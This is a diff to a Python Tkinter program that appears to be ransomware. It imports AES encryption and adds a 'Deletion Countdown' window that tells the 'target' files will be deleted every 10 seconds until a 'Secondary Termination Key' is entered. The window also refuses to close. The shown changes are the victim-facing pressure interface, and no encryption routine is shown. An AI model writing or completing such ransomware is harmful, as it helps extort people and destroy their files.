@@ -12,7 +12,7 @@ from datetime import datetime
 from json import dumps
 from os import makedirs, path, remove, walk
 # import tkinter as tk
-from tkinter import Toplevel, Entry, Label, Button, simpledialog
+from tkinter import Toplevel, Entry, Label, Button, simpledialog, FLAT, messagebox
 from uuid import uuid4
 from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
@@ -508,7 +508,7 @@ class CountdownDialog(Toplevel):
 # DeletionCountdownDialog class for deletion countdown interactions
 class DeletionCountdownDialog(Toplevel):
     """ in this class,
-we have a countdown timer to show the user how much time left before deleting all encrypted files """
+    we have a countdown timer to show the user how much time left before deleting all encrypted files """
     def __init__(self, parent, stop_deletion_callback):
         super().__init__(parent)
         self.iconbitmap(ICON_PATH)
@@ -516,6 +516,9 @@ we have a countdown timer to show the user how much time left before deleting al
         self.attributes('-topmost', True)
         self.title("Deletion Countdown")
         self.resizable(False, False)
+
+        # below variables only used for clean coding and defining this variable aren't necessary
+        self.countdownLabel = None
 
         # Get window and screen dimensions to calculate the Position of the Screen Center
         windowWidth = 400
@@ -528,18 +531,40 @@ we have a countdown timer to show the user how much time left before deleting al
         # Apply the calculated position to the Countdown box
         self.geometry(f"{windowWidth}x{windowHeight}+{positionRight}+{positionDown}")
 
-        self.protocol("WM_DELETE_WINDOW", self.ont_try_close)
+        self.protocol("WM_DELETE_WINDOW", self.on_try_close)
         self.grab_set()
         self.focus_set()
         self.init_ui()
 
 
+    # Create Function to Setting up countdown dialog UI
     def init_ui(self):
-        pass
+        # Open thanks Image and resize it
+        thanksImage = Image.open(THANKS_PATH).resize((80, 80))
+        thanksPhoto = ImageTk.PhotoImage(thanksImage)
 
-    def ont_try_close(self):
-        pass
+        # Create an image label from thanksPhoto
+        # noinspection PyTypeChecker
+        labelImage = Label(self, image=thanksPhoto)
+        labelImage.photo = thanksPhoto
+        labelImage.pack(pady=20)
 
+        # Create a Label for the Count-Down and pack it
+        self.countdownLabel = Label(self, text="Next file will be deleted in Every 10 seconds...", font=("Helvetica CE", 12))
+        self.countdownLabel.pack()
+
+        # Create a Button to submit Secondary Termination Key
+        buttonStop = Button(self, text="Enter Key:", command=self.on_enter_key, font=("Helvetica CE", 10), relief=FLAT)
+        buttonStop.pack(pady=10, padx=10, ipadx=20, ipady=5)
+
+
+    # Function to show warning when target tries to close app
+    @staticmethod
+    def on_try_close():
+        messagebox.showwarning("Warning", "This window cannot be closed directly.")
+
+    def on_enter_key(self):
+        pass
 
 
 # if __name__ == "__main__":
